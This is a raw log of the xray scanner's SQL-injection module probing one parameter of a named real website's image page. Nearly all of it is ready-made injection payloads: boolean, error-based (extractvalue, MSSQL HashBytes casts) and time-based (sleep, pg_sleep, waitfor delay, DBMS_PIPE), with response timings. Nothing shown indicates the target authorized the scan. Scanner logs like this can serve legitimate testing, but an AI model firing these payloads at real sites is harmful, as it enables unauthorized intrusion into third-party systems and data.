Enabled plugins: [sqldet]

[DBUG] 2024-03-09 16:00:15 [controller:dispatcher.go:185] init sqldet
[DBUG] 2024-03-09 16:00:15 [controller:dispatcher.go:230] fingers count: 4
[DBUG] 2024-03-09 16:00:15 [controller:dispatcher.go:231] building finger tree
[DBUG] 2024-03-09 16:00:15 [controller:dispatcher.go:239] start to trim the invocation tree
[DBUG] 2024-03-09 16:00:15 [controller:dispatcher.go:290] init the event bus
[DBUG] 2024-03-09 16:00:15 [controller:dispatcher.go:363] service finger count: 1, flow finger count: 4
[DBUG] 2024-03-09 16:00:15 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:17 [default:know.go:138] new knowledge for https://kingston.rentershotline.ca, is_php: fingerprint_found
[INFO] 2024-03-09 16:00:17 [default:dispatcher.go:443] processing GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:17 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:17 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:18 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:18 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:19 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:19 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%2B1%3D1
[DBUG] 2024-03-09 16:00:19 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%2B4%3D9
[DBUG] 2024-03-09 16:00:19 [sqldet:detector.go:242] boolean based handling key: box pvalue: 18408/**/and+1=1 nvalue: 18408/**/and+4=9 pn 100 pt 62
[DBUG] 2024-03-09 16:00:19 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%27q%27%3D%27q
[DBUG] 2024-03-09 16:00:20 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:20 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%27c%27%3D%27u
[DBUG] 2024-03-09 16:00:20 [sqldet:detector.go:109] error expr based handling box 18408'and/**/extractvalue(1,concat(char(126),md5(1673458760)))and'
[*] scanned: 0, pending: 1, requestSent: 10, latency: 249.50ms, failedRatio: 0.00%
[DBUG] 2024-03-09 16:00:20 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%281673458760%29%29%29and%27
[DBUG] 2024-03-09 16:00:20 [sqldet:detector.go:242] boolean based handling key: box pvalue: 18408'and'q'='q nvalue: 18408'and'c'='u pn 93 pt 60
[DBUG] 2024-03-09 16:00:20 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%22and%22l%22%3D%22l
[DBUG] 2024-03-09 16:00:20 [sqldet:detector.go:109] error expr based handling box 18408"and/**/extractvalue(1,concat(char(126),md5(1456642107)))and"
[DBUG] 2024-03-09 16:00:20 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%22and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%281456642107%29%29%29and%22
[DBUG] 2024-03-09 16:00:20 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%22and%22i%22%3D%22y
[DBUG] 2024-03-09 16:00:20 [sqldet:detector.go:109] error expr based handling box extractvalue(1,concat(char(126),md5(1442272523)))
[DBUG] 2024-03-09 16:00:20 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=extractvalue%281%2Cconcat%28char%28126%29%2Cmd5%281442272523%29%29%29
[DBUG] 2024-03-09 16:00:20 [sqldet:detector.go:242] boolean based handling key: box pvalue: 18408"and"l"="l nvalue: 18408"and"i"="y pn 93 pt 60
[DBUG] 2024-03-09 16:00:20 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:21 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:21 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408
[DBUG] 2024-03-09 16:00:21 [sqldet:detector.go:515] sql normal stat https://kingston.rentershotline.ca/viewImages.php?box=18408 [248 249 249 248 248 250] avg 248.66666666666666 stddev 0.7453559924999298 sleep 2
[DBUG] 2024-03-09 16:00:21 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=%28select%2Afrom%28select%2Bsleep%280%29union%2F%2A%2A%2Fselect%2B1%29a%29
[DBUG] 2024-03-09 16:00:21 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=%28select%2Afrom%28select%2Bsleep%282%29union%2F%2A%2A%2Fselect%2B1%29a%29
[DBUG] 2024-03-09 16:00:21 [sqldet:detector.go:109] error expr based handling box 18408'and(select'1'from/**/cast(md5(1897396663)as/**/int))>'0
[DBUG] 2024-03-09 16:00:21 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%28select%271%27from%2F%2A%2A%2Fcast%28md5%281897396663%29as%2F%2A%2A%2Fint%29%29%3E%270
[DBUG] 2024-03-09 16:00:22 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box (select*from(select+sleep(2)union/**/select+1)a) p 249 n 254 s 2
[DBUG] 2024-03-09 16:00:22 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%28select%2Afrom%28select%2Bsleep%280%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
[DBUG] 2024-03-09 16:00:22 [sqldet:detector.go:109] error expr based handling box 18408/**/and/**/cast(md5('1502372120')as/**/int)>0
[DBUG] 2024-03-09 16:00:22 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%2F%2A%2A%2Fcast%28md5%28%271502372120%27%29as%2F%2A%2A%2Fint%29%3E0
[DBUG] 2024-03-09 16:00:22 [sqldet:detector.go:109] error expr based handling box convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1975831598')))
[DBUG] 2024-03-09 16:00:22 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=convert%28int%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%271975831598%27%29%29%29
[DBUG] 2024-03-09 16:00:22 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%28select%2Afrom%28select%2Bsleep%282%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
[DBUG] 2024-03-09 16:00:23 [sqldet:detector.go:109] error expr based handling box 18408'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1936701875')))>'0
[DBUG] 2024-03-09 16:00:23 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%2F%2A%2A%2Fconvert%28int%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%271936701875%27%29%29%29%3E%270
[DBUG] 2024-03-09 16:00:23 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box 18408'and(select*from(select+sleep(2))a/**/union/**/select+1)=' p 253 n 258 s 2
[DBUG] 2024-03-09 16:00:23 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%22and%28select%2Afrom%28select%2Bsleep%280%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%22
[DBUG] 2024-03-09 16:00:23 [sqldet:detector.go:142] error based handling box 18408鎈'"\(
[DBUG] 2024-03-09 16:00:23 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%E9%8E%88%27%22%5C%28
[DBUG] 2024-03-09 16:00:24 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%22and%28select%2Afrom%28select%2Bsleep%282%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%22
[DBUG] 2024-03-09 16:00:24 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box 18408"and(select*from(select+sleep(2))a/**/union/**/select+1)=" p 247 n 256 s 2
[DBUG] 2024-03-09 16:00:24 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%28select%2B1%2F%2A%2A%2Ffrom%2F%2A%2A%2Fpg_sleep%280%29%29%3E0%2F%2A%2A%2F
[*] scanned: 0, pending: 1, requestSent: 30, latency: 304.48ms, failedRatio: 0.00%
[DBUG] 2024-03-09 16:00:25 [sqldet:detector.go:142] error based handling box 18408'"\(
[DBUG] 2024-03-09 16:00:25 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27%22%5C%28
[DBUG] 2024-03-09 16:00:26 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%28select%2B1%2F%2A%2A%2Ffrom%2F%2A%2A%2Fpg_sleep%282%29%29%3E0%2F%2A%2A%2F
[DBUG] 2024-03-09 16:00:26 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box 18408/**/and(select+1/**/from/**/pg_sleep(2))>0/**/ p 1247 n 246 s 2
[DBUG] 2024-03-09 16:00:26 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27%2F%2A%2A%2Fand%28select%271%27from%2F%2A%2A%2Fpg_sleep%280%29%29%3A%3Atext%3E%270
[DBUG] 2024-03-09 16:00:27 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27%2F%2A%2A%2Fand%28select%271%27from%2F%2A%2A%2Fpg_sleep%282%29%29%3A%3Atext%3E%270
[DBUG] 2024-03-09 16:00:28 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box 18408'/**/and(select'1'from/**/pg_sleep(2))::text>'0 p 247 n 247 s 2
[DBUG] 2024-03-09 16:00:28 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A0%27%2F%2A%2A%2F
[*] scanned: 0, pending: 1, requestSent: 35, latency: 314.19ms, failedRatio: 0.00%
[DBUG] 2024-03-09 16:00:30 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A2%27%2F%2A%2A%2F
[DBUG] 2024-03-09 16:00:31 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box 18408/**/and(select+1)>0waitfor/**/delay'0:0:2'/**/ p 568 n 249 s 2
[DBUG] 2024-03-09 16:00:31 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A0
[DBUG] 2024-03-09 16:00:32 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A2
[DBUG] 2024-03-09 16:00:33 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box 18408'and(select+1)>0waitfor/**/delay'0:0:2 p 250 n 249 s 2
[DBUG] 2024-03-09 16:00:33 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%2F%2A%2A%2F2%3DDBMS_PIPE.RECEIVE_MESSAGE%28%27s%27%2C0%29
[*] scanned: 0, pending: 1, requestSent: 39, latency: 307.98ms, failedRatio: 0.00%
[DBUG] 2024-03-09 16:00:35 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%2F%2A%2A%2Fand%2F%2A%2A%2F0%3DDBMS_PIPE.RECEIVE_MESSAGE%28%27b%27%2C2%29
[DBUG] 2024-03-09 16:00:36 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box 18408/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE('b',2) p 497 n 574 s 2
[DBUG] 2024-03-09 16:00:36 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27%2F%2A%2A%2Fand%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28%27g%27%2C0%29%3D%27g
[DBUG] 2024-03-09 16:00:37 [default:client.go:188] GET https://kingston.rentershotline.ca/viewImages.php?box=18408%27%2F%2A%2A%2Fand%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28%27z%27%2C2%29%3D%27z
[DBUG] 2024-03-09 16:00:39 [sqldet:detector.go:341] time based handling https://kingston.rentershotline.ca/viewImages.php?box=18408 box 18408'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('z',2)='z p 273 n 1237 s 2
[DBUG] 2024-03-09 16:00:39 [controller:dispatcher.go:501] sending last stat
[INFO] 2024-03-09 16:00:39 [controller:dispatcher.go:572] controller released, task done
PS C:\Users\86189\Desktop\vscan\xray_windows_amd64.exe>